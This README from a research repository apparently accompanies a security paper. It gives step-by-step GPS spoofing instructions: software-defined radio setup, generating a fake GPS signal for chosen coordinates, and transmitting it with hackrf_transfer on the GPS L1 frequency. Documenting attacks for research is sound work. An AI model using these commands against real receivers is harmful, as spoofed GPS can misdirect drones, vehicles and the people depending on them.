# Attack cases mentioned in the paper
Code for conducting attacks mentioned in the paper. We have 2 zero-day attacks which have been reported to respective authorities as well. 

## GPS Spoofing
### Prerequisite
1) You need to have a software-defined radio like <a href="https://greatscottgadgets.com/hackrf/one/" target="_blank">HackRF One</a> which could simulate GPS L1 signal. 
2) Install HackRF package
```bash
sudo apt-get update -y
sudo apt-get install -y hackrf
```

3) Install <a href="https://github.com/osqzss/gps-sdr-sim" target="_blank"> GPS position simulator</a>


### How to execute it?
1) You need to specify the GPS satellite constellation through a GPS broadcast ephemeris file. The daily GPS broadcast ephemeris file (brdc) is a merge of the individual site navigation files into one. The archive for the daily file is:ftp://cddis.gsfc.nasa.gov/gnss/data/daily/

2) Find the latest brdc file for navigation data creation

3) When you use <a href="https://github.com/purseclab/M2MON/tree/main/attacks/GPS_spoofing" target="_blank"> brdc3540.14n</a> as an ephemeris file, you can generate GPS messages by using the command in the below. 
```bash
./gps-sdr-sim -b 8 -e brdc3540.14n -l 31.286502,121.032669,100
```

4) gpssim.bin will be created and the file needs to transferred

5) Spoof the GPS messages 
```bash
hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 0
```
